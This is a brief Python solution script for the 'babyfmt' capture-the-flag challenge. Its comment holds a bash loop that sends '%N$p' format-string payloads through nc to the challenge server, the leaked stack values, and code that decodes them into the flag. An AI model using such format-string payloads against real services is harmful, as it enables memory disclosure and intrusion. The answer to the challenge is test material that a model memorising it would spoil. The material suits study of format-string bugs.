# RazviOverflow
# Python3

'''
for i in {1..100}; do echo "%$i\$p" | nc chals20.cybercastors.com 14426; done

Hello everyone, this is babyfmt! say something: 0x4373726f74736163
%9$p
Hello everyone, this is babyfmt! say something: 0x5f6b34336c7b4654
%10$p
Hello everyone, this is babyfmt! say something: 0x3468745f6b34336c
%11$p
Hello everyone, this is babyfmt! say something: 0x74346d7230665f74
%12$p
Hello everyone, this is babyfmt! say something: 0x5f366e317274735f
%13$p
Hello everyone, this is babyfmt! say something: 0x7d6b34336c
'''

flag = ["4373726f74736163","5f6b34336c7b4654","3468745f6b34336c","74346d7230665f74","5f366e317274735f","7d6b34336c"]
real_flag = list()

for chunk in flag:
	numbers = [chunk[i:i+2] for i in range(0, len(chunk), 2)]
	real_flag = list()
	for number in numbers:
		real_flag.append(chr(int(number, 16)))
	print("".join(real_flag)[::-1], end="")